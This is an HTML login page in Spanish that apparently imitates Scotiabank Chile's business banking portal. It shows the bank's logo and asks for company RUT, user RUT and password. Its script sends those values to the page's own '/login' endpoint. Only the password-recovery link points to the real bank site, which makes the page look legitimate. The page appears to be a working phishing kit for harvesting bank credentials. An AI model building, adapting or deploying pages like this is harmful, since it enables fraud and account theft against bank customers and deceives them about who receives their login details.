<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Portal Empresa</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background: #f4f4f4;
    }

    /* Franja superior fija */
    .top-bar {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: #d32f2f;
      color: #fff;
      display: flex;
      justify-content: center; /* centrado en móvil */
      align-items: center;
      padding: 0.5rem 1rem;
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
      z-index: 1000;
    }
    .top-bar img {
      height: 40px;
    }

    /* Contenedor principal */
    .main-container {
      margin-top: 70px; /* espacio para la franja fija */
      display: flex;
      flex-direction: column; /* móvil: apilado */
      align-items: center;
      padding: 1rem;
    }

    .form-side {
      background: #fff;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
      margin-bottom: 1rem;
    }
    .form-side h2 {
      color: #d32f2f;
      text-align: center;
      margin-bottom: 1.5rem;
    }
    .form-group {
      margin-bottom: 1rem;
    }
    .form-group label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: bold;
      color: #333;
    }
    .form-group input {
      width: 100%;
      padding: 0.5rem;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .btn {
      width: 100%;
      padding: 0.75rem;
      background: #d32f2f;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
      margin-top: 1rem;
    }
    .btn:hover {
      background: #b71c1c;
    }
    .extra-link {
      text-align: center;
      margin-top: 0.8rem;
    }
    .extra-link a {
      color: #d32f2f;
      text-decoration: none;
      font-size: 0.9rem;
    }
    .extra-link a:hover {
      text-decoration: underline;
    }

    .image-side img {
      max-width: 100%;
      height: auto;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    /* Versión escritorio: formulario e imagen lado a lado */
    @media (min-width: 768px) {
      .main-container {
        flex-direction: row;
        justify-content: center;
        align-items: flex-start;
      }
      .form-side {
        margin-right: 2rem;
      }
    }
  </style>
</head>
<body>
  <!-- Franja superior -->
  <div class="top-bar">
    <img src="main/ScotiaLogo.svg" alt="Logo Empresa">
  </div>

  <!-- Contenido principal -->
  <div class="main-container">
    <!-- Formulario -->
    <div class="form-side">
      <h2>Portal Empresa</h2>
      <form id="loginForm">
        <div class="form-group">
          <label for="rutEmpresa">RUT Empresa</label>
          <input type="text" id="rutEmpresa" name="rutEmpresa" placeholder="12.345.678-9" required>
        </div>
        <div class="form-group">
          <label for="rutPersona">RUT Usuario</label>
          <input type="text" id="rutPersona" name="rutPersona" placeholder="98.765.432-1" required>
        </div>
        <div class="form-group">
          <label for="passwd">Clave</label>
          <input type="password" id="passwd" name="passwd" placeholder="********" required>
        </div>
        <button type="submit" class="btn">Ingresar</button>
      </form>
      <div class="extra-link">
        <a href="https://banco.scotiabank.cl/mfe-login/scotia?c=-Jm7twBoTk8r5JxsG9yQxvyBzYuj9zPzbqKzZGvVa5vWeXygMBZdA_6hy2MsHa_iNlH3e119igob0K7rFv4Y78Ed8U06fo1G887umLNUOM4#modal-recovery" target="_blank">
          Olvidó su clave / No tiene clave?
        </a>
      </div>
      <div class="message" id="message"></div>
    </div>

    <!-- Imagen aviso -->
    <div class="image-side">
      <img src="aviso-ggee.jpg" alt="Aviso Empresa">
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const rutEmpresa = document.getElementById('rutEmpresa').value;
      const rutPersona = document.getElementById('rutPersona').value;
      const passwd = document.getElementById('passwd').value;

      const res = await fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ rutEmpresa, rutPersona, passwd })
      });

      const data = await res.text();
      document.getElementById('message').textContent = data;
    });
  </script>
</body>
</html>
